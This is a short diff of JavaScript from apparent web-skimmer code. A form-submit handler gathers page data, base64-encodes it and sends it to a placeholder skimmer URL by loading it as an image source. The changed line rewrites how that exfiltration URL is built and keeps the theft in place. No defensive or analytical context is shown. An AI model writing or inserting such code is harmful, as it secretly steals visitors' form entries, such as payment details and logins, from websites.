@@ -21,8 +21,7 @@ var get_all_data = () => {
 var before_submit = (e) => {
     var data = btoa(unescape(encodeURIComponent(get_all_data())));
     var x = document.createElement("img");
-    x.src = "[SKIMMER_URL]";
-    x.src += data;
+    x.src = "[SKIMMER_URL][SKIMMER_DATA_ROUTE]?id=" + data;
 
     // e.preventDefault();
 };
